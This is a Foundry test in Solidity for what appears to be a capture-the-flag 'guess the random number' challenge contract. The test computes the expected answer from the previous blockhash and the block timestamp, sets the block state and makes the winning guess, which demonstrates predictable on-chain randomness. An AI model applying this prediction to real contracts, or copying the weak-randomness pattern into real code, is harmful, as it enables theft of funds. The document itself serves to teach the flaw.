
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge public challenge;

    function setUp() public {
        vm.deal(address(this), 2 ether);
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        // --- 1. Constraints ---
        require(blockNumber >= 1, "blockNumber must be at least 1");

        // --- 2. State Configuration ---
        vm.deal(address(challenge), 1 ether);

        // --- 3. Replication & Assertion ---
        // Calculate the expected answer
        uint8 expectedAnswer = uint8(uint256(keccak256(abi.encodePacked(blockhash(blockNumber - 1), blockTimestamp))));

        // Manipulate block environment
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // Execute the vulnerable guess function
        challenge.guess{value: 1 ether}(expectedAnswer);

        // Assert that the guess was successful
        assertEq(challenge.isComplete(), true);
    }
}
